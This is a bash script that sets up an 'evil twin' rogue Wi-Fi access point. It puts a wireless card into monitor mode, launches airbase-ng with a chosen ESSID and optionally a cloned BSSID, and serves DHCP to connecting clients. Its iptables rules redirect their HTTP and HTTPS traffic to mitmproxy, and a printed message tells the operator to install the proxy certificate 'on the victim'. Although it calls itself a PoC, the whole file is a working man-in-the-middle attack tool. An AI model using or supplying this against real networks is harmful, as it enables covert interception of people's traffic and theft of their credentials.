#!/bin/bash
# Written by: Alek
# 20240620
#
#-------------------------
# INCLUDE
#-------------------------
source ./env
source ./whitelist.cnf


# To capture the interrupt event
#trap InterruptHandler INT
#function InterruptHandler {
#	echo "Ctrl+C detected. Proceding to restore everything"
#	Iptables 0
#}

# It get in an apropiated format the output 
# of the iw dev wlanX info
function WlanInfo {
	local output=""
	
	output=$(sudo iw dev $1 info)
	l1=$(echo "$output" | sed -n '1p')
	l4=$(echo "$output" | sed -n '4p')
	l5=$(echo "$output" | sed -n '5p')
	l7=$(echo "$output" | sed -n '7p')
	bold_l5=$(tput bold)$(echo "$l5")$(tput sgr0)
	echo "# $l1:" 	# Interface wlanX
	echo "# $l4"  	# addr xx:xx:xx:xx:xx:xx
	echo -e "\\b#  $bold_l5" # type managed/monitor
	echo "# $l7" 		# channel XX
}

# just a separator "------"
function Separator {
	local counter=1
	echo -n "#-"
  while [ $counter -lt 75 ];
  do 
  	let "counter++"
    echo -n "-"
  done
  echo "-"
}

# It configure the TAP interface created by the airbase-ng
function TAPinterface {
	Separator
	echo "# [+] Airbase-ng ta0 interface will be configurated in the background..."
	# Without this, airbase-ng won't work
	# No need to unconfigure ta0 at the termination of airbase-ng because
	# it'll delete the interface.
	(sleep $TIMER;sudo ifconfig at0 192.168.0.1 netmask 255.255.255.0 up;echo -e $(date +"%H:%M:%S") " [+] Interface at0 configured!!\\n") &
	Separator
}

# This service is attached to the at0 interface created by airbase-ng
function DhcpService {
	local option=$1
	if [ $option -eq 1 ];then
		if  dpkg -l isc-dhcp-server &> /dev/null;then
	  	  Separator
	  	  echo "# DHCP server (isc-dhcp-server) is installed."
  		  echo "# Starting service..."
	  	  Separator
				sleep $TIMER
				sudo systemctl stop isc-dhcp-server.service &> /dev/null
				sudo systemctl start isc-dhcp-server.service &> /dev/null
				ret=$(sudo systemctl status isc-dhcp-server.service | grep Active | awk '{print$2}')
				if [ $ret = failed ];then
	  	  	Separator
					echo "# DHCP service couldn't being started. Something is wrong. Check dhcpd.conf"
					echo "# For more details run: journalctl -xeu isc-dhcp-server.service"
					echo "# Exiting..."
	  	  	Separator
					exit 1
				elif [ $ret = active ];then
	  	  	Separator
					echo "# DHCP Service started successfully"
	  	  	Separator
					sleep $TIMER
				fi
		else
	  	  Separator
  		  echo "# DHCP server (isc-dhcp-server) is not installed."
				echo "# Exiting..."
	  	  Separator
				exit 1
		fi
	else
	  	  Separator
  		  echo "# Stopping DHCP service..."
	  	  Separator
				sudo systemctl stop isc-dhcp-server.service
				ret=$(sudo systemctl status isc-dhcp-server.service | grep Active | awk '{print$2}')
				if [ $ret = inactive ];then
	  	  	Separator
					echo "# DHCP service stopped!."
	  	  	Separator
				fi
	fi
}

# Configure the wireless interface into monitor mode
# and rollaback it to managed mode
function Monitor {
	local option=$1
	if [ $option -eq 1 ];then
	  Separator
		WlanInfo $WLAN
		sudo ip link set dev $WLAN down
	  Separator
		sudo airmon-ng check kill;sleep $TIMER
	  Separator
		sudo airmon-ng start $WLAN;sleep $TIMER
	  Separator
		sudo ip link set dev $WLAN up
		WlanInfo $WLAN
	  Separator;sleep $TIMER
	else
	  Separator
		sudo ifconfig $WLAN down
		sudo airmon-ng stop $WLAN
		sudo ifconfig $WLAN up
	  Separator
		WlanInfo $WLAN
		sudo systemctl restart NetworkManager
	  Separator
	fi
}

# Configure all the requiered rules to provide
# internet to the clients on the fake AP
# eth0: Internet connection
# wlan1: wireless fake AP interface
# at0: TAP interface created by airbase-ng
function Iptables {
	# To allow route packets from one interface to another
	# eth0 is the interface with internet connectivity
	# at0 is the tap interface created by the fale AP
	local option=$1 # set iptables or flush them

	if [ $option -eq 1 ];then # Turn on forwarding
		Separator
		echo "# Setting iptables and forwarding..."
		sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
		sudo $IPT --flush
		#--------------------------------------------------------------------------
		# Required to internet connection            
		sudo $IPT -A FORWARD -i $ETH -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
		sudo $IPT -A FORWARD -i at0 -o $ETH -j ACCEPT
		sudo $IPT -t nat -A POSTROUTING -o $ETH -j MASQUERADE
		#--------------------------------------------------------------------------
		# Uncomment what is required
		#--------------------------------------------------------------------------
		# WHITELIST
		#--------------------------------------------------------------------------
		# Required just in case you need to specify a list of clients to be 
		# allow to connect to the fake AP. Uncomment if required
		#
		#sudo $IPT -A INPUT -i at0 -m mac --mac-source $client1MAC -j ACCEPT
		#sudo $IPT -A INPUT -i at0 -m mac --mac-source $client2MAC -j ACCEPT
		#sudo $IPT -P INPUT DROP
		#--------------------------------------------------------------------------
		# Man in the middle rules. 
		#--------------------------------------------------------------------------
		# Required to intercep traffic with mitmproxy
		# Run in another terminal: mitmproxy --mode transparent --showhost 
		#
		sudo $IPT -t nat -A PREROUTING -i at0 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
		# For this rule to work, it's require to deploy the root certificate that
		# is used by mitmproxy into the browser of the testing device.
		#
		sudo $IPT -t nat -A PREROUTING -i at0 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080
		echo "# Iptables set!!"
		Separator
	else # Turn off packet forwarding and flush iptables
		Separator
		echo "# Flushing iptables..."
		sudo bash -c "echo 0 > /proc/sys/net/ipv4/ip_forward"
		sudo $IPT -P INPUT ACCEPT
		sudo $IPT -P FORWARD ACCEPT
		sudo $IPT -P OUTPUT ACCEPT
		sudo $IPT -F
		sudo $IPT -X
		sudo $IPT -t nat -F
		sudo $IPT -t nat -X
		sudo $IPT -t mangle -F
		sudo $IPT -t mangle -X
		sudo $IPT -t raw -F
		sudo $IPT -t raw -X
		echo "# Iptables flushed!!"
		Separator
	fi
}

function MACvalidation {
  local mac=$1
  local regex="^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"

  if [[ $mac =~ $regex ]]; then
    echo 0 # mac is valid
  else
    echo 1 # invalid mac
  fi
}

function MonitorModeCheck {
	# Check interface mode. The expected mode is: monitor
	local interface="$1"
	ret=$(sudo iw dev $interface info | grep -i type| awk '{print$2}')
  if [ $ret = "monitor" ]; then
		echo 0 # Interface in monitor mode which it's ok
	else
		echo 1 # Not in monitor mode. Exiting...
	fi
}

function ChannelValidation {
  # Is this a number and in range of 2.4Ghz channels?
  local value="$1"
  if [[ $value =~ ^-?[0-9]+([.][0-9]+)?$ ]]; then
  	if [[ $value -le 14 &&  $value -ge 1 ]]; then
			echo 0 # It's numeric and between 1 and 14 (2.4 Ghz)
		else
			echo 1 # Not in range
		fi
  else
    echo 1 # No numeric
  fi
}

function Helper {
	Separator
  echo "Usage: $0 -c <channel> -e <essid> -b <bssid> -t <AP-type>"
	echo "      -c channel: AP channel to listen to (Optional, Default ch 1)"
  echo "      -e essid: AP's Network ID"
	echo "      -b bssid: AP's MAC (Optional, default wireless interface's MAC)"
	echo "      -t AP-type: OPN|WPA2 (Optional, default OPN=Open)"
}


############
## main
############

#Example 1
# An open AP with SSID "@@@"
# sudo airbase-ng -c 6 -e "@@@" $WLAN

	# if nothing is provided then...
	if [ $# -eq 0 ]; then
  	echo "No arguments provided."
	  Helper # Shows help
		exit 1
	fi

	# Catching arguments
	while getopts ":b:c:e:t:h" opt; do
  	case ${opt} in
	    b )
  	    bssid=$OPTARG
				retcode=$(MACvalidation $bssid)
				if [ $retcode -eq 1  ]; then
					echo "MAC invalid. Check it again"
					exit 1
				fi
      ;;
    	c )
      	channel=$OPTARG
				retcode=$(ChannelValidation $channel)
				if [ $retcode -eq 1  ]; then
					echo "Wrong value. Check again the channel argument"
					exit 1
				fi
      ;;
	    e )
  	    essid=$OPTARG
				if [ -z "$essid" ]; then
  				echo "Msg: Missing ESSID.  Please, provide one" >&2
					exit 1
				fi
			;;
			t ) # Type that could be OPN or WPA2. Default OPN
				aptype=$OPTARG
    		ret=$(echo "$aptype" | awk '{print tolower($0)}')
				aptype=$ret
				if [ $aptype = "opn" ];then
					echo "# [+]  OPEN AP selected. No encryption will be use."
				elif [ $aptype = "wpa2" ];then
					echo "# [+] WPA2 AP selected with CCMP."
				else
					echo "Invalid option: $aptype"
					Helper
					exit 1
				fi
			;;	
	    h ) # Help
  	    Helper
    	  exit 0
      ;;
	    \? )
  	    echo "Invalid option: -$OPTARG" >&2
    	  Helper
      	exit 1
      ;;
	    : )
  	    echo "-$OPTARG missing argument." >&2
    	  Helper
      	exit 1
      ;;
	  esac
	done
	shift $((OPTIND -1))

# Setting interface on monitor mode
Monitor 1

# Checking monitor mode on the interface	
ret=$(MonitorModeCheck $WLAN)
if [ $ret -eq 1  ]; then
	Separator
	echo "# Interface $WLAN must be in monitor mode to proceed. Exiting..."
	Separator
	exit 1 # Can't continue. Exiting... 
fi

# Setting packet forwarding
Iptables 1

# Assuming default channel if it wasn't provided.
if [ -z "$channel" ]; then
	Separator
	echo "# [+] Msg: Assuming default channel: $defaultCH"
	Separator
	channel=$defaultCH
fi

#--------------------
# Running fake AP
#--------------------

# Intro
	Separator
	# Printing in bold the title
	title="# [+] STARTING EVILTWIN"
	bold_title=$(tput bold)$(echo "$title")$(tput sgr0)
	echo -e \\n$bold_title
	Separator

# Configuring in the bg the ta0 interface that will be provided by
# airbase-ng. At this moment such interface doesn´t exist.
	TAPinterface

# Starting DHCP service over the tap interface 
# in the bg
	(sleep 10s;echo "";DhcpService 1)&

	# If empty then it'll take the default value.
	if [ -z "$aptype" ]; then
			aptype="opn"
	fi
	# Choosing the right AP type
	case $aptype in
		opn )
						echo "# [+] AP OPN selected (Default)"
						echo "# [+] Don't forget to run in another terminal:"
						echo "# [+] mitmproxy --mode transparent --showhost"
						echo "# [-] "
						echo "# [+] Note:" 
						echo "# [+]  - Use this if you want to see the intercepted traffic"
						echo "# [+]  - If so, dont't forget to deploy the mitmproxy certificate on the victim"
				Separator
						echo "# [+] Airbase-ng lunched!!!"
				Separator
				if [ -z "$bssid" ]; then
					# Open Network. The bssid will be the MAC of the 
					# wireless interface
					sudo airbase-ng -v -e $essid -c $channel $WLAN 
				else
					sudo airbase-ng -v -e $essid -c $channel -a $bssid  $WLAN
				fi
		;;
		wpa2 ) # WPA2/CCMP. Sadly there is not way to provide the password
					 # To has a fully WPA2 AP we need to add the hostapd and that 
					 # falls out the scope of this PoC. 
				echo "# [+] AP WPA2 selected"
				Separator
				if [ -z "$bssid" ]; then
					# WPA2. The bssid will be the MAC of the 
					# wireless interface
					sudo airbase-ng -v -e $essid -c $channel -Z 4 $WLAN 
				else
					sudo airbase-ng -v -e $essid -c $channel -a $bssid  -Z 4 $WLAN
				fi
		;;
	esac


# Handler to terminate the script and rollback all changes
	if [ $? -ne 0 ]; then
  	echo "# [+] Ctrl+C trapped. Rolling back all changes..."
		Iptables 0
		Monitor 0
		DhcpService 0
		Separator
		msg="# [+] All changes were rollbacked"
		bold_msg=$(tput bold)$(echo "$msg")$(tput sgr0)
		echo $bold_msg
		Separator
	  exit 0
	fi

